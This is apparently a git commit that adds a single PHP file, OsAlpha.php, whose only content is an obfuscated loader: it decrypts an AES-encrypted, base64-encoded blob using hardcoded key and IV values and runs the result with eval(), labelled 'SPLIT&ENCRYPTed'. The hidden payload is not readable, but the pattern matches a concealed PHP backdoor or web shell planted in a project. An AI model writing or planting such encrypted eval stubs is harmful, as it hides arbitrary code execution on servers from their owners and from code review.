e985071a407497b78ab9cfda090a4781446cfd8c
Leo Angelo <157434257+putangina889@users.noreply.github.com>
2025-09-25 15:31:26 +0700

    Create OsAlpha.php

---
+++ OsAlpha.php
@@ -0,0 +1,10 @@
+<?php
+// SPLIT&ENCRYPTed
+eval(openssl_decrypt(
+    base64_decode('5GwY6AnXLIm324g9tFNB1EO7BgAFTZB0CLPqAHBn2HiPrS3JbovgE62hp3F2z2pGc1nr4wROwBpPgEbSkmJVxviJrutEs6FDjQ8RH3wsjCo0jklIajlI3pu8wQnTcmR5Ycj1VUB2rdZ4EVrltrBFqGmZtO1JnMkDwrVh2Ad5W0exmiy6pSmCgSoi+rivh6qGxtNkxP5ScGAnaf8WB6bV6UXG6TlZ7AwSy6gKJsYZazhBzgiSe6We6uNdmxreQMdsbw5aS9gWZswPrZ0HC4dcxw=='),
+    'AES-128-CBC',
+    base64_decode('0x2VGWMh7gmz+ylMIlOHRQ=='),
+    OPENSSL_RAW_DATA,
+    base64_decode('AjlnGHQkJA2S7oUEEd4GmQ==')
+));
+?>
